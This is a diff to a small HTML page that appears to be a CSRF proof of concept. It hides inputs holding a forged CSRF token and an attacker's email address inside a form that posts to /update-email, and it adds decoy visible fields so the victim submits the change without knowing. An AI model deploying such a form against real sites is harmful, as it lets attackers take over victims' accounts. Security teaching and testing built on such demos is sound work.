@@ -7,9 +7,10 @@
 </head>
 <body>
     <form action="/update-email" method="POST">
-        (the following two inputs are going to be hidden (type="hidden"), because this is the attack, and we want to trick the victim)
-        <input type="text" name="_csrf" value="malicious-csrf-token">
-        <input type="text" name="email" value="attacker@example.com">
+        <input type="hidden" name="_csrf" value="malicious-csrf-token">
+        <input type="hidden" name="email" value="attacker@example.com">
+        <input type="text" value="Your csrf-token">
+        <input type="text" value="Your email-adress">
         <input type="submit" value="Update Email">
     </form>
 </body>
